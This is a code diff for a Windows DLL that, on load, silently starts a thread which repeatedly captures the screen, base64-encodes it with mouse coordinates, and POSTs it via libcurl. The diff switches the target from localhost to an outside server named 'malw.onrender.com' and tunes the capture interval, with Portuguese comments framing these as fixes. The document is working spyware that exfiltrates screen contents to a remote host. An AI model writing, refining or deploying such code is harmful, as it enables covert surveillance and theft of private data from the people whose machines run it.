@@ -56,7 +56,7 @@ std::string captureScreenAsBase64() {
         BITMAPINFOHEADER bi;
         bi.biSize = sizeof(BITMAPINFOHEADER);
         bi.biWidth = w;
-        bi.biHeight = -h;
+        bi.biHeight = -h; // Top-down DIB
         bi.biPlanes = 1;
         bi.biBitCount = 24;
         bi.biCompression = BI_RGB;
@@ -70,7 +70,7 @@ std::string captureScreenAsBase64() {
         std::vector<unsigned char> bmpBuffer(sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + dwBmpSize);
 
         BITMAPFILEHEADER bfh;
-        bfh.bfType = 0x4D42;
+        bfh.bfType = 0x4D42; // "BM"
         bfh.bfSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + dwBmpSize;
         bfh.bfReserved1 = 0;
         bfh.bfReserved2 = 0;
@@ -107,7 +107,6 @@ void executeSinglePost() {
 
         std::string screenshotBase64 = captureScreenAsBase64();
 
-        // Evita enviar strings vazias se a captura falhar
         if (screenshotBase64.empty()) {
             curl_easy_cleanup(curl);
             return;
@@ -115,7 +114,8 @@ void executeSinglePost() {
 
         std::string info = "{\"mouse_x\": \"" + mouse_x + "\", \"mouse_y\": \"" + mouse_y + "\", \"screenshot\": \"" + screenshotBase64 + "\"}";
 
-        curl_easy_setopt(curl, CURLOPT_URL, "http://localhost:3000/a/");
+        // CORREÇÃO: URL limpa sem duplicação de protocolo
+        curl_easy_setopt(curl, CURLOPT_URL, "https://malw.onrender.com/a/");
         curl_easy_setopt(curl, CURLOPT_POST, 1L);
         curl_easy_setopt(curl, CURLOPT_POSTFIELDS, info.c_str());
         curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, (long)info.length());
@@ -128,7 +128,6 @@ void executeSinglePost() {
 
         CURLcode res = curl_easy_perform(curl);
         if (res != CURLE_OK) {
-            // Permite ver o erro no output do debugger (ex: Visual Studio)
             OutputDebugStringA(("cURL Erro: " + std::string(curl_easy_strerror(res)) + "\n").c_str());
         }
 
@@ -140,7 +139,8 @@ void executeSinglePost() {
 DWORD WINAPI BackgroundWorker(LPVOID lpParam) {
     while (true) {
         executeSinglePost();
-        Sleep(1); 
+        // CORREÇÃO: Intervalo de 100ms para evitar estouro de memória e Denial of Service (DoS) no servidor
+        Sleep(100); 
     }
     return 0;
 }
@@ -149,12 +149,12 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserv
     switch (ul_reason_for_call) {
     case DLL_PROCESS_ATTACH:
         DisableThreadLibraryCalls(hModule);
-        curl_global_init(CURL_GLOBAL_ALL); // Inicializa no carregamento da DLL
+        curl_global_init(CURL_GLOBAL_ALL); 
         CreateThread(NULL, 0, BackgroundWorker, NULL, 0, NULL);
         break;
 
     case DLL_PROCESS_DETACH:
-        curl_global_cleanup(); // Limpa ao descarregar a DLL
+        curl_global_cleanup(); 
         break;
     }
     return TRUE;
